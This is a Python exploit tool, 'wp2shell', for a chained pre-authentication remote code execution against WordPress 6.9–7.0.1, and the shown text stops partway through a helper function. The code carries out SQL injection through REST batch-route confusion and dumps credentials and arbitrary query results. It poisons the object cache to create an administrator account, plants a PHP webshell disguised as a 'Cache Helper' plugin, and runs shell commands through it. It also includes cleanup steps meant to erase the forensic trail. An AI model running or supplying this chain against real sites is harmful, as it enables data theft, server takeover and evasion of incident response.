#!/usr/bin/env python3
"""
WordPress Pre-Authentication Remote Code Execution
===================================================
CVE-2026-63030 — REST API Batch Route Confusion (SQL Injection)
CVE-2026-60137 — Customizer Changeset Re-entry (Privilege Escalation)

Affected:  WordPress 6.9.0–6.9.4, 7.0.0–7.0.1
Fixed in:  WordPress 6.9.5, 7.0.2

Chain:
  Batch desync → UNION SQLi → object cache poison → hierarchy loop →
  changeset publish (admin) → parse_request hook → REST re-entry →
  administrator creation → plugin webshell → OS command execution

Requirements for full RCE ('exploit' command):
  - At least one published post (for oEmbed local shortcircuit)
  - No persistent object cache (Redis/Memcached disables non-split path)
  - Pretty permalinks OR ?rest_route= accessible (for re-entry)

The 'check' and 'read' commands work universally on all affected versions.

Usage:
  wp2shell check  <url>                        — passive vuln confirmation
  wp2shell read   <url> --preset users         — dump credentials
  wp2shell read   <url> --query "SELECT ..."   — arbitrary extraction
  wp2shell exploit <url>                       — full pre-auth RCE
  wp2shell shell  <url> --user admin --pass x  — authenticated shell only
"""

from __future__ import annotations

import argparse
import hashlib
import http.cookiejar
import io
import json
import os
import re
import secrets
import shlex
import sys
import time
import urllib.error
import urllib.parse
import urllib.request
import uuid
import zipfile
from dataclasses import dataclass, field
from typing import Any, Callable, Dict, List, Optional, Tuple

# ═══════════════════════════════════════════════════════════════════════════════
# Metadata
# ═══════════════════════════════════════════════════════════════════════════════

__version__ = "3.0.0"
__author__ = "CryptoCat"
__license__ = "MIT"

BANNER = r"""
                ___        __         ____
 _      ______ |__ \ _____/ /_  ___  / / /
| | /| / / __ \__/ // ___/ __ \/ _ \/ / /
| |/ |/ / /_/ / __/(__  ) / / /  __/ / /
|__/|__/ .___/____/____/_/ /_/\___/_/_/
      /_/
  CVE-2026-63030 + CVE-2026-60137
  WordPress Pre-Auth RCE  [v%s]
""" % __version__

# ═══════════════════════════════════════════════════════════════════════════════
# Constants
# ═══════════════════════════════════════════════════════════════════════════════

DESYNC_PRIMER = {"method": "POST", "path": "///"}
FAKE_ID_BASE = 1_800_000_000
POST_DATE = "2020-01-01 00:00:00"
WP_POSTS_COLUMNS = 23

EMBED_WIDTH = "500"
EMBED_HEIGHT = "750"
EMBED_ATTRS_SERIALIZED = 'a:2:{s:5:"width";s:3:"500";s:6:"height";s:3:"750";}'

MARKER = "WP2S"
UNION_MARKER_HEX = "776f726470726573733078"  # "wordpress0x" — prefix for UNION extraction

AFFECTED_RANGE = ("6.9.0", "6.9.4", "7.0.0", "7.0.1")


# ═══════════════════════════════════════════════════════════════════════════════
# Output
# ═══════════════════════════════════════════════════════════════════════════════

_TTY = sys.stderr.isatty()


def _c(code: str, text: str) -> str:
    return f"\033[{code}m{text}\033[0m" if _TTY else text


def info(msg: str) -> None:
    if not _QUIET:
        print(f"  {_c('34', '[*]')} {msg}", file=sys.stderr)


def good(msg: str) -> None:
    if not _QUIET:
        print(f"  {_c('32', '[+]')} {msg}", file=sys.stderr)


def bad(msg: str) -> None:
    print(f"  {_c('31', '[-]')} {msg}", file=sys.stderr)


def warn(msg: str) -> None:
    print(f"  {_c('33', '[!]')} {msg}", file=sys.stderr)


def debug(msg: str) -> None:
    if _VERBOSE:
        print(f"  {_c('90', '[D]')} {msg}", file=sys.stderr)


def step(n: int, total: int, msg: str) -> None:
    print(f"\n  {_c('1', f'[{n}/{total}]')} {msg}", file=sys.stderr)


def progress(msg: str) -> None:
    if _TTY:
        sys.stderr.write(f"\r\033[K      {msg}")
        sys.stderr.flush()


def clear_progress() -> None:
    if _TTY:
        sys.stderr.write("\r\033[K")
        sys.stderr.flush()


def detail(msg: str) -> None:
    print(f"      {msg}", file=sys.stderr)


_VERBOSE = False
_QUIET = False


# ═══════════════════════════════════════════════════════════════════════════════
# Exceptions
# ═══════════════════════════════════════════════════════════════════════════════

class TargetError(Exception):
    """Target unreachable or not responding as expected."""


class ExtractionError(Exception):
    """Data extraction failed."""


class ExploitError(Exception):
    """Exploitation chain failed at a specific stage."""


# ═══════════════════════════════════════════════════════════════════════════════
# SQL Helpers
# ═══════════════════════════════════════════════════════════════════════════════

def sql_hex(s: str) -> str:
    """Encode string as MySQL hex literal. Empty string returns ''."""
    if not s:
        return "''"
    return "0x" + s.encode("utf-8").hex()


def sql_post_row(
    row_id: str | int,
    content: str = "",
    title: str = "",
    status: str = "publish",
    slug: str = "",
    parent: int = 0,
    post_type: str = "post",
    author: int = 1,
) -> str:
    """Build one SELECT clause matching wp_posts schema (23 columns).

    row_id can be an integer or raw SQL expression (for dynamic IDs).
    """
    id_col = str(row_id)
    slug = slug or f"r{secrets.token_hex(3)}"
    return "SELECT " + ",".join([
        id_col,
        str(author),
        f"'{POST_DATE}'",
        f"'{POST_DATE}'",
        sql_hex(content),
        sql_hex(title),
        "''",
        sql_hex(status),
        "'closed'",
        "'closed'",
        "''",
        sql_hex(slug),
        "''",
        "''",
        f"'{POST_DATE}'",
        f"'{POST_DATE}'",
        "''",
        str(parent),
        "''",
        "0",
        sql_hex(post_type),
        "''",
        "0",
    ])


def oembed_cache_key(url: str) -> str:
    """Compute the wp_posts.post_name for an oembed_cache entry."""
    payload = url + EMBED_ATTRS_SERIALIZED
    return hashlib.md5(payload.encode()).hexdigest()


# ═══════════════════════════════════════════════════════════════════════════════
# HTTP Transport
# ═══════════════════════════════════════════════════════════════════════════════

@dataclass
class Response:
    status: int
    body: str
    elapsed: float
    headers: Dict[str, str] = field(default_factory=dict)

    def json(self) -> Any:
        return json.loads(self.body)


class Client:
    """HTTP client for communicating with a WordPress target."""

    def __init__(self, base_url: str, *, timeout: float = 30.0,
                 proxy: Optional[str] = None) -> None:
        self.base_url = base_url.rstrip("/")
        self.timeout = timeout
        self.request_count = 0
        self._batch_url: Optional[str] = None
        handlers: list = []
        if proxy:
            handlers.append(urllib.request.ProxyHandler(
                {"http": proxy, "https": proxy}))
        self._opener = urllib.request.build_opener(*handlers)
        self._opener.addheaders = [("User-Agent", "Mozilla/5.0 (compatible)")]

    @property
    def batch_url(self) -> str:
        if self._batch_url is None:
            self._batch_url = self._negotiate_batch_url()
        return self._batch_url

    def _negotiate_batch_url(self) -> str:
        """Try pretty-permalink batch URL first, fall back to ?rest_route=."""
        pretty = f"{self.base_url}/wp-json/batch/v1"
        try:
            resp = self._send(pretty, method="POST",
                              data=b'{"requests":[]}',
                              headers={"Content-Type": "application/json"},
                              timeout=min(self.timeout, 10))
            if resp.status == 207:
                debug(f"Batch via pretty permalink: {pretty}")
                return pretty
        except Exception:
            pass
        fallback = f"{self.base_url}/?rest_route=/batch/v1"
        debug(f"Batch via rest_route param: {fallback}")
        return fallback

    def get(self, path: str) -> Response:
        url = self.base_url + (path if path.startswith("/") else f"/{path}")
        return self._send(url, method="GET")

    def post_json(self, path: str, data: Any) -> Response:
        url = self.base_url + (path if path.startswith("/") else f"/{path}")
        return self._send(url, method="POST",
                          data=json.dumps(data).encode(),
                          headers={"Content-Type": "application/json"})

    def batch(self, payload: dict, *, timeout: Optional[float] = None) -> Response:
        return self._send(
            self.batch_url,
            method="POST",
            data=json.dumps(payload).encode(),
            headers={"Content-Type": "application/json"},
            timeout=timeout or self.timeout,
        )

    def _send(self, url: str, *, method: str = "GET", data: bytes = None,
              headers: dict = None, timeout: float = None) -> Response:
        req = urllib.request.Request(url, data=data, method=method)
        for k, v in (headers or {}).items():
            req.add_header(k, v)
        self.request_count += 1
        start = time.monotonic()
        try:
            resp = self._opener.open(req, timeout=timeout or self.timeout)
            return Response(resp.status, resp.read().decode("utf-8", "replace"),
                            time.monotonic() - start, dict(resp.headers))
        except urllib.error.HTTPError as exc:
            body = exc.read().decode("utf-8", "replace") if exc.fp else ""
            return Response(exc.code, body, time.monotonic() - start,
                            dict(exc.headers) if exc.headers else {})
        except OSError as exc:
            raise TargetError(f"Cannot reach {url}: {exc}") from None


# ═══════════════════════════════════════════════════════════════════════════════
# Batch Desync Engine
# ═══════════════════════════════════════════════════════════════════════════════

class Desync:
    """Constructs and delivers batch desync payloads (CVE-2026-63030).

    The desync exploits an off-by-one in serve_batch_request_v1():
    wp_parse_url("///") returns false → WP_Error pushed to $validation but
    NOT $matches → all subsequent $matches[$i] are shifted by one, causing
    request N to be dispatched under request N+1's handler.

    We use the types-route bypass: /wp/v2/types registers NO schema for
    per_page, orderby, or author_exclude. When the desync dispatches this
    request through the posts handler, those params flow unsanitized into
    WP_Query, enabling SQL injection via author__not_in.
    """

    def __init__(self, client: Client) -> None:
        self.client = client

    def blind_inject(self, condition: str, *, timeout: float = None) -> Response:
        """Boolean oracle: inject into WHERE clause, detect via response body."""
        sqli = f"0) AND ({condition})-- -"
        return self.client.batch(self._blind_payload(sqli),
                                 timeout=timeout or self.client.timeout)

    def union_inject(self, rows: str, *, timeout: float = None,
                     tail_requests: List[dict] = None) -> Response:
        """UNION injection via widgets cross-schema desync.

        per_page=500 → posts_per_page=500 → 500<500 is FALSE → split disabled.
        orderby=none → empty ORDER BY (avoids MySQL 8 table-qualified UNION error).
        Multi-line comment kills trailing WHERE/LIMIT across template newlines.
        """
        sql_term = "\n-- " * 6
        sqli = f"0) AND 1=0 UNION ALL {rows}{sql_term}"
        return self.client.batch(
            self._union_payload(sqli, tail_requests), timeout=timeout)

    def _blind_payload(self, sqli: str) -> dict:
        encoded = urllib.parse.quote(sqli, safe="")
        inner = {"requests": [
            DESYNC_PRIMER,
            {"method": "GET",
             "path": f"/wp/v2/users?author_exclude={encoded}"},
            {"method": "GET", "path": "/wp/v2/posts"},
            {"method": "GET", "path": "/wp/v2/categories"},
        ]}
        return {"requests": [
            DESYNC_PRIMER,
            {"method": "POST", "path": "/wp/v2/posts", "body": inner},
            {"method": "POST", "path": "/batch/v1", "body": {"requests": []}},
        ]}

    def _union_payload(self, sqli: str,
                       tail_requests: List[dict] = None) -> dict:
        encoded = urllib.parse.quote(sqli, safe="")
        inner_requests = [
            DESYNC_PRIMER,
            {"method": "GET", "path": (
                f"/wp/v2/widgets?author_exclude={encoded}"
                "&per_page=500&orderby=none"
            )},
            {"method": "GET", "path": "/wp/v2/posts"},
            {"method": "GET", "path": "/wp/v2/categories"},
        ]
        if tail_requests:
            inner_requests.extend(tail_requests)
            inner_requests.append(
                {"method": "POST", "path": "/wp/v2/users", "body": {}})
        return {"requests": [
            DESYNC_PRIMER,
            {"method": "POST", "path": "/wp/v2/posts",
             "body": {"requests": inner_requests}},
            {"method": "POST", "path": "/batch/v1", "body": {"requests": []}},
        ]}


# ═══════════════════════════════════════════════════════════════════════════════
# Extraction Engines
# ═══════════════════════════════════════════════════════════════════════════════

class BlindExtractor:
    """Boolean-blind binary search (works universally, ~7 requests/char)."""

    technique = "blind"

    def __init__(self, desync: Desync) -> None:
        self.desync = desync
        self.requests = 0

    def available(self) -> bool:
        return self._oracle("1=1") and not self._oracle("1=2")

    def confirm_timing(self, sleep: float = 3.0) -> Tuple[float, float]:
        """Return (baseline, delayed) elapsed times."""
        baseline = self._timed("1=1")
        delayed = self._timed(f"SLEEP({sleep})")
        return baseline, delayed

    def integer(self, query: str) -> int:
        val = self.extract(query, max_length=11)
        return int(val) if val.lstrip("-").isdigit() else 0

    def extract(self, query: str, *, max_length: int = 128,
                on_char: Callable[[str], None] = None) -> str:
        length = self._binary_search(
            f"LENGTH(({query}))", 0, max_length)
        chars: list = []
        for i in range(1, length + 1):
            c = self._binary_search(
                f"ORD(SUBSTR(({query}),{i},1))", 32, 126)
            chars.append(chr(c))
            if on_char:
                on_char("".join(chars))
        return "".join(chars)

    def _oracle(self, condition: str) -> bool:
        resp = self.desync.blind_inject(condition)
        self.requests += 1
        try:
            data = resp.json()
            body = data["responses"][1]["body"]["responses"][1]["body"]
            return isinstance(body, list) and len(body) > 0
        except (json.JSONDecodeError, KeyError, IndexError, TypeError,
                AttributeError):
            return False

    def _timed(self, condition: str) -> float:
        resp = self.desync.blind_inject(condition, timeout=60)
        self.requests += 1
        return resp.elapsed

    def _binary_search(self, expr: str, low: int, high: int) -> int:
        while low < high:
            mid = (low + high) // 2
            if self._oracle(f"{expr}>{mid}"):
                low = mid + 1
            else:
                high = mid
        return low


class UnionExtractor:
    """In-band UNION extraction (1 request per value, fastest).

    Forges a fake WP_Post whose post_title contains the hex-encoded query
    result. The response includes the rendered post with our data.
    """

    technique = "union"

    def __init__(self, desync: Desync) -> None:
        self.desync = desync
        self.requests = 0

    def available(self) -> bool:
        result = self.extract("SELECT 'wp2shell_probe'")
        return result == "wp2shell_probe"

    def integer(self, query: str) -> int:
        val = self.extract(query)
        return int(val) if val and val.lstrip("-").isdigit() else 0

    def extract(self, query: str, *, max_length: int = 4096,
                on_char: Callable[[str], None] = None) -> Optional[str]:
        title_expr = f"CONCAT(0x{UNION_MARKER_HEX},HEX(CAST(({query}) AS CHAR)))"
        row = self._forge_row(title=title_expr)
        resp = self.desync.union_inject(row)
        self.requests += 1
        return self._decode_response(resp)

    def _forge_row(self, *, title: str = "''") -> str:
        return "SELECT " + ",".join([
            "99999999",
            "1",
            f"'{POST_DATE}'",
            f"'{POST_DATE}'",
            "''",
            title,
            "''",
            "'publish'",
            "'closed'",
            "'closed'",
            "''",
            sql_hex(f"u{secrets.token_hex(4)}"),
            "''",
            "''",
            f"'{POST_DATE}'",
            f"'{POST_DATE}'",
            "''",
            "0",
            "''",
            "0",
            "'post'",
            "''",
            "0",
        ])

    def _decode_response(self, resp: Response) -> Optional[str]:
        marker = bytes.fromhex(UNION_MARKER_HEX).decode()
        idx = resp.body.find(marker)
        if idx < 0:
            return None
        after = resp.body[idx + len(marker):]
        hex_chars: list = []
        for ch in after:
            if ch in "0123456789abcdefABCDEF":
                hex_chars.append(ch)
            else:
                break
        if not hex_chars:
            return ""
        try:
            return bytes.fromhex("".join(hex_chars)).decode("utf-8", "replace")
        except ValueError:
            return None


class ErrorExtractor:
    """Error-based extraction via EXTRACTVALUE (~30 chars/request)."""

    technique = "error"

    def __init__(self, desync: Desync) -> None:
        self.desync = desync
        self.requests = 0

    def available(self) -> bool:
        resp = self.desync.blind_inject(
            "EXTRACTVALUE(1,CONCAT(0x7e,'wp2sprobe'))")
        self.requests += 1
        return "wp2sprobe" in resp.body

    def integer(self, query: str) -> int:
        val = self.extract(query)
        return int(val) if val and val.lstrip("-").isdigit() else 0

    def extract(self, query: str, *, max_length: int = 128,
                on_char: Callable[[str], None] = None) -> Optional[str]:
        if max_length <= 30:
            return self._chunk(query, 1, max_length)
        result = ""
        offset = 1
        while len(result) < max_length:
            chunk = self._chunk(query, offset, 30)
            if not chunk:
                break
            result += chunk
            offset += len(chunk)
            if on_char:
                on_char(result)
            if len(chunk) < 30:
                break
        return result

    def _chunk(self, query: str, offset: int, length: int) -> Optional[str]:
        condition = (
            f"EXTRACTVALUE(1,CONCAT(0x7e,"
            f"SUBSTR(({query}),{offset},{length})))"
        )
        resp = self.desync.blind_inject(condition)
        self.requests += 1
        match = re.search(r"~([^'\"<]*)", resp.body)
        return match.group(1) if match else None


def select_extractor(desync: Desync) -> Optional[Any]:
    """Auto-detect the fastest available extraction technique."""
    union = UnionExtractor(desync)
    if union.available():
        good("UNION extraction available (in-band, 1 request/value)")
        return union

    error = ErrorExtractor(desync)
    if error.available():
        good("Error-based extraction available (~30 chars/request)")
        return error

    blind = BlindExtractor(desync)
    if blind.available():
        info("Blind extraction available (binary search, ~7 req/char)")
        return blind

    return None


# ═══════════════════════════════════════════════════════════════════════════════
# Reconnaissance
# ═══════════════════════════════════════════════════════════════════════════════

def find_embed_url(client: Client) -> Optional[str]:
    """Locate a published post URL for oEmbed local shortcircuit."""
    try:
        resp = client.get("/?rest_route=/wp/v2/posts&per_page=1&_fields=link")
        if resp.status == 200:
            posts = resp.json()
            if posts and isinstance(posts, list):
                return posts[0]["link"]
    except (json.JSONDecodeError, KeyError, IndexError, TypeError):
        pass

    try:
        resp = client.get("/")
        if resp.status == 200:
            m = re.search(
                r'<link\s+rel=["\']canonical["\']\s+href=["\']([^"\']+)',
                resp.body)
            if m:
                return m.group(1)
    except TargetError:
        pass

    return f"{client.base_url}/?p=1"


def detect_version(client: Client) -> Optional[str]:
    """Attempt to read WordPress version from generator meta or feeds."""
    try:
        resp = client.get("/")
        m = re.search(
            r'<meta[^>]+name=["\']generator["\'][^>]+content=["\']WordPress\s+([\d.]+)',
            resp.body)
        if m:
            return m.group(1)
    except TargetError:
        pass
    return None


def discover_prefix(extractor, default: str = "wp_") -> str:
    """Discover table prefix via INFORMATION_SCHEMA."""
    try:
        result = extractor.extract(
            "SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES "
            "WHERE TABLE_SCHEMA=DATABASE() AND TABLE_NAME LIKE '%usermeta' "
            "ORDER BY TABLE_NAME LIMIT 1",
            max_length=64)
        if result and result.endswith("usermeta"):
            return result[:-8]
    except Exception:
        pass
    return default


def discover_admin_id(extractor, prefix: str) -> int:
    """Find the first administrator's user ID."""
    try:
        result = extractor.integer(
            f"SELECT u.ID FROM {prefix}users u "
            f"INNER JOIN {prefix}usermeta m ON u.ID=m.user_id "
            f"WHERE m.meta_key='{prefix}capabilities' "
            f"AND m.meta_value LIKE '%administrator%' "
            f"ORDER BY u.ID LIMIT 1")
        if result > 0:
            return result
    except Exception:
        pass
    return 1


# ═══════════════════════════════════════════════════════════════════════════════
# Exploitation Chain
# ═══════════════════════════════════════════════════════════════════════════════

@dataclass
class PoisonGraph:
    """Defines the hierarchy loop structure for cache poisoning.

    Two independent parent-loops serve distinct purposes in the chain:

    Loop 1 (changeset_id <-> outer_id):
      Detected during oEmbed fallthrough's wp_update_post on oembed_id.
      Walk: oembed_id → changeset (override) → outer → changeset → LOOP.
      Fix-up calls wp_update_post(changeset_id) which reads poisoned cache
      (type=customize_changeset, status=future, date=past) and writes it
      to the real DB. Future+past auto-converts to 'publish', firing
      _wp_customize_publish_changeset → wp_set_current_user(admin).

    Loop 2 (reentry_id <-> inner_id):
      Detected during nav_menu_item UPDATE path's wp_update_post on
      navitem_id. The setting uses a positive post_id (real DB post
      poisoned as type=nav_menu_item), entering the UPDATE path at
      nav-menu.php:614. object_id=inner_id → get_post(inner_id)->
      post_parent=reentry_id → $original_parent=reentry_id. Walk:
      navitem_id → reentry (override) → inner → reentry → LOOP.
      Fix-up calls wp_update_post(reentry_id), writing cached
      type=request+status=parse to DB. Transition fires
      do_action("parse_request") → rest_api_loaded → serve_request
      re-enters the batch with admin context.
    """
    cache_post_ids: List[int]
    admin_id: int

    def __post_init__(self) -> None:
        base = FAKE_ID_BASE + secrets.randbelow(100_000_000)
        self.outer_id = base
        self.inner_id = base + 1
        self.changeset_id = self.cache_post_ids[0]
        self.oembed_id = self.cache_post_ids[1]
        self.navitem_id = self.cache_post_ids[2]
        self.reentry_id = self.cache_post_ids[3]

    def build_rows(self, changeset_json: str, embed_url: str) -> str:
        """Build the 7 UNION rows for the complete cache poisoning payload."""
        oembed_id_expr = (
            f"IF((@_wp2s:=IFNULL(@_wp2s,0)+1)=1,"
            f"{self.oembed_id},2000000000)"
        )

        embed_content = (
            f'[embed width="{EMBED_WIDTH}" height="{EMBED_HEIGHT}"]'
            f'{embed_url}'
            f'[/embed]'
        )

        rows = [
            # Trigger: embed shortcode in content, rendered by the_content
            sql_post_row(0, content=embed_content, title="trigger",
                         slug="trigger"),

            # Changeset: future+past → auto-publish → privilege escalation
            sql_post_row(self.changeset_id, content=changeset_json,
                         title="changeset", status="future",
                         slug=str(uuid.uuid4()),
                         parent=self.outer_id,
                         post_type="customize_changeset"),

            # Outer loop partner: parent=changeset creates Loop 1
            sql_post_row(self.outer_id, title="outer", status="draft",
                         slug="outer", parent=self.changeset_id),

            # oEmbed target: empty content → cache fallthrough → wp_update_post
            # Dynamic ID prevents re-poisoning on re-entry (@_wp2s=2 → 2B)
            sql_post_row(oembed_id_expr, title="oembed", slug="oembed",
                         parent=self.changeset_id),

            # Nav menu item: poisoned as type=nav_menu_item so
            # is_nav_menu_item() passes → enters UPDATE path
            sql_post_row(self.navitem_id, title="navitem", slug="navitem",
                         post_type="nav_menu_item"),

            # Re-entry post: type=request+status=parse → "parse_request" hook
            sql_post_row(self.reentry_id, title="reentry", status="parse",
                         slug="reentry", parent=self.inner_id,
                         post_type="request"),

            # Inner loop partner: parent=reentry creates Loop 2;
            # also serves as object_id target (post_parent=reentry read
            # at nav-menu.php:506 to set $original_parent)
            sql_post_row(self.inner_id, title="inner", status="draft",
                         slug="inner", parent=self.reentry_id),
        ]
        return " UNION ALL ".join(rows)


def build_changeset(graph: PoisonGraph) -> str:
    """Construct the changeset JSON stored in the poisoned post_content.

    Uses nav_menu_item[navitem_id] (positive/real post ID):
      - Positive ID → $is_placeholder=false → $menu_item_db_id=navitem_id
      - is_nav_menu_item(navitem_id) reads get_post_type from poisoned
        cache → 'nav_menu_item' → check passes (nav-menu.php:426)
      - Enters UPDATE path → nav-menu.php:614 calls wp_update_post
      - type=post_type → nav-menu.php:502-506 reads get_post(object_id)
      - object_id=inner_id (cached with post_parent=reentry_id)
      - $original_parent = reentry_id → post_parent set to reentry_id
      - wp_update_post fires hierarchy check with non-zero $post_id
      - Walk detects Loop 2 (reentry ↔ inner), fix-up writes reentry
        to DB → wp_transition_post_status → parse_request → re-entry
    """
    setting_key = f"nav_menu_item[{graph.navitem_id}]"
    data = {
        setting_key: {
            "value": {
                "object_id": graph.inner_id,
                "object": "post",
                "menu_item_parent": 0,
                "position": 1,
                "type": "post_type",
                "title": "",
                "url": "",
                "description": "",
                "attr_title": "",
                "target": "",
                "classes": "",
                "xfn": "",
                "status": "publish",
                "nav_menu_term_id": 0,
                "_invalid": False,
            },
            "type": "nav_menu_item",
            "user_id": graph.admin_id,
        }
    }
    return json.dumps(data, separators=(",", ":"))


class Exploiter:
    """Orchestrates the full pre-auth RCE chain."""

    def __init__(self, client: Client, *, prefix: str = "wp_") -> None:
        self.client = client
        self.desync = Desync(client)
        self.prefix = prefix

    def seed_oembed(self, embed_url: str, token: str) -> bool:
        """Create 4 oembed_cache posts via UNION-triggered embed rendering.

        Injects a fake post (ID=0) with [embed] shortcodes. When the posts
        controller renders it via the_content, WP resolves the embeds locally
        and creates oembed_cache posts in the database.
        """
        urls = [f"{embed_url}#{token}{i}" for i in range(4)]
        content = "".join(
            f'[embed width="{EMBED_WIDTH}" height="{EMBED_HEIGHT}"]'
            f'{u}[/embed]'
            for u in urls
        )
        row = sql_post_row(0, content=content, title="seed", slug="seed")
        debug(f"Seeding oEmbed with URL base: {embed_url}")
        resp = self.desync.union_inject(row)
        return resp.status in (200, 207, 400, 404)

    def extract_cache_ids(self, embed_url: str, token: str,
                          extractor) -> Optional[List[int]]:
        """Extract the 4 oembed_cache post IDs needed for the poison graph."""
        ids: list = []
        for i in range(4):
            url = f"{embed_url}#{token}{i}"
            key = oembed_cache_key(url)
            expr = (
                f"SELECT ID FROM {self.prefix}posts "
                f"WHERE post_type='oembed_cache' AND post_name='{key}' LIMIT 1"
            )
            pid = extractor.integer(expr)
            if pid == 0:
                return None
            ids.append(pid)
            progress(f"cache_post_ids[{i}] = {pid}")
        clear_progress()
        return ids

    def escalate(self, cache_post_ids: List[int], embed_url: str,
                 token: str, admin_id: int,
                 username: str, password: str, email: str) -> bool:
        """Fire the complete escalation chain.

        Returns True if user creation succeeded (verified via login).
        """
        graph = PoisonGraph(cache_post_ids, admin_id)
        changeset_json = build_changeset(graph)
        trigger_url = f"{embed_url}#{token}1"
        union_rows = graph.build_rows(changeset_json, trigger_url)

        user_body = {
            "username": username,
            "password": password,
            "email": email,
            "roles": ["administrator"],
        }

        debug(f"Poison graph: changeset={graph.changeset_id}, "
              f"oembed={graph.oembed_id}, navitem={graph.navitem_id}, "
              f"reentry={graph.reentry_id}")
        debug(f"Fake IDs: outer={graph.outer_id}, inner={graph.inner_id}")

        resp = self.desync.union_inject(
            union_rows,
            tail_requests=[
                {"method": "POST", "path": "/wp/v2/users", "body": user_body},
            ],
            timeout=self.client.timeout * 2,
        )

        if self._check_creation_response(resp):
            return True

        time.sleep(1)
        return self._verify_login(username, password)

    def _check_creation_response(self, resp: Response) -> bool:
        """Look for HTTP 201 in the batch response (user created)."""
        try:
            data = resp.json()
            inner = data.get("responses", [{}])[1].get("body", {})
            for r in inner.get("responses", []):
                if isinstance(r, dict) and r.get("status") == 201:
                    return True
        except (json.JSONDecodeError, KeyError, IndexError, TypeError,
                AttributeError):
            pass
        return False

    def _verify_login(self, username: str, password: str) -> bool:
        """Confirm user creation by attempting login."""
        session = AdminSession(self.client.base_url,
                               timeout=self.client.timeout)
        return session.login(username, password)


# ═══════════════════════════════════════════════════════════════════════════════
# Post-Exploitation
# ═══════════════════════════════════════════════════════════════════════════════

class AdminSession:
    """Authenticated WordPress admin session with webshell capabilities."""

    def __init__(self, base_url: str, *, timeout: float = 30.0,
                 proxy: Optional[str] = None) -> None:
        self.base_url = base_url.rstrip("/")
        self.timeout = timeout
        self._slug: Optional[str] = None
        self._token: Optional[str] = None
        self._jar = http.cookiejar.CookieJar()
        handlers = [urllib.request.HTTPCookieProcessor(self._jar)]
        if proxy:
            handlers.append(urllib.request.ProxyHandler(
                {"http": proxy, "https": proxy}))
        self._opener = urllib.request.build_opener(*handlers)
        self._opener.addheaders = [("User-Agent", "Mozilla/5.0 (compatible)")]

    def login(self, username: str, password: str) -> bool:
        self._get("/wp-login.php")
        self._post("/wp-login.php", {
            "log": username,
            "pwd": password,
            "wp-submit": "Log In",
            "redirect_to": f"{self.base_url}/wp-admin/",
            "testcookie": "1",
        })
        return any(c.name.startswith("wordpress_logged_in")
                   for c in self._jar)

    def deploy_webshell(self) -> Optional[str]:
        """Upload a plugin-based webshell. Returns the shell URL path."""
        self._slug = "cache_" + secrets.token_hex(4)
        self._token = secrets.token_hex(16)

        page = self._get("/wp-admin/plugin-install.php?tab=upload")
        nonce = self._find_nonce(page, "upload-plugin")
        if not nonce:
            return None

        php = self._generate_shell_php()
        zip_data = self._create_plugin_zip(php)
        body, content_type = self._multipart_encode(
            fields={
                "_wpnonce": nonce,
                "_wp_http_referer": "/wp-admin/plugin-install.php?tab=upload",
                "install-plugin-submit": "Install Now",
            },
            files={"pluginzip": (f"{self._slug}.zip", zip_data)},
        )

        req = urllib.request.Request(
            f"{self.base_url}/wp-admin/update.php?action=upload-plugin",
            data=body,
            headers={"Content-Type": content_type},
        )
        try:
            self._opener.open(req, timeout=self.timeout).read()
        except urllib.error.HTTPError:
            pass

        self._activate_plugin()
        return f"/wp-content/plugins/{self._slug}/{self._slug}.php"

    def run(self, shell_path: str, command: str) -> Optional[str]:
        """Execute a command via the webshell."""
        params = urllib.parse.urlencode(
            {"t": self._token, "c": command})
        url = f"{self.base_url}{shell_path}?{params}"
        try:
            resp = self._opener.open(
                urllib.request.Request(url), timeout=self.timeout)
            output = resp.read().decode("utf-8", "replace")
            m = re.search(rf"{MARKER}::(.*?)::END", output, re.S)
            return m.group(1) if m else None
        except (urllib.error.HTTPError, OSError):
            return None

    def cleanup(self, shell_path: str) -> bool:
        """Remove the webshell plugin directory from the target."""
        out = self.run(
            shell_path,
            'd="$(pwd)"; '
            'case "$d" in */wp-content/plugins/*) '
            'cd / && rm -rf "$d" && echo OK;; esac'
        )
        return out is not None and "OK" in out

    def delete_user(self, shell_path: str, username: str,
                    reassign_to: int = 1) -> bool:
        """Delete a WordPress user via the webshell (clean forensic trail)."""
        safe_user = username.replace("'", "\\'")
        out = self.run(
            shell_path,
            f"cd ../../.. && "
            f"php -r \""
            f"require_once 'wp-load.php';"
            f"require_once ABSPATH.'wp-admin/includes/user.php';"
            f"\\$u=get_user_by('login','{safe_user}');"
            f"echo \\$u&&wp_delete_user(\\$u->ID,{reassign_to})?'DELETED':'FAILED';"
            f"\""
        )
        return out is not None and "DELETED" in out

    def _generate_shell_php(self) -> str:
        # Token is sha256'd so the plaintext never sits in a PHP file on disk
        token_hash = hashlib.sha256(self._token.encode()).hexdigest()
        return (
            "<?php\n"
            "/*\nPlugin Name: Cache Helper\nVersion: 1.0\n"
            "Description: Object cache optimization.\n*/\n"
            f"$h=hash('sha256',$_GET['t']??'');\n"
            f"if($h!=='{token_hash}')return;\n"
            f"if(isset($_GET['c']))"
            f"{{chdir(__DIR__);echo '{MARKER}::'.shell_exec($_GET['c']).'::END';}}\n"
            f"if(isset($_GET['r'])){{$f=@file_get_contents($_GET['r']);"
            f"echo '{MARKER}::'.($f===false?'NOREAD':base64_encode($f)).'::END';}}\n"
            f"if(isset($_GET['w'])&&isset($_POST['d']))"
            f"{{$ok=@file_put_contents($_GET['w'],$_POST['d'])!==false;"
            f"echo '{MARKER}::'.($ok?'OK':'FAIL').'::END';}}\n"
        )

    def _create_plugin_zip(self, php: str) -> bytes:
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
            zf.writestr(f"{self._slug}/{self._slug}.php", php)
        return buf.getvalue()

    def _activate_plugin(self) -> None:
        page = self._get("/wp-admin/plugins.php")
        pattern = (
            rf'action=activate&amp;plugin='
            rf'{re.escape(self._slug)}%2F{re.escape(self._slug)}\.php'
            rf'&amp;_wpnonce=([0-9a-f]+)'
        )
        m = re.search(pattern, page)
        if m:
            self._get(
                f"/wp-admin/plugins.php?action=activate"
                f"&plugin={self._slug}%2F{self._slug}.php"
                f"&_wpnonce={m.group(1)}")

    def _find_nonce(self, html: str, action: str) -> Optional[str]:
        pattern = (
            rf'action="[^"]*action={re.escape(action)}"'
            r'.*?name="_wpnonce"[^>]*value="([0-9a-f]+)"'
        )
        m = re.search(pattern, html, re.S)
        if m:
            return m.group(1)
        m = re.search(
            r'<input[^>]*name="_wpnonce"[^>]*value="([0-9a-f]+)"', html)
        return m.group(1) if m else None

    @staticmethod
    def _multipart_encode(
        fields: Dict[str, str],
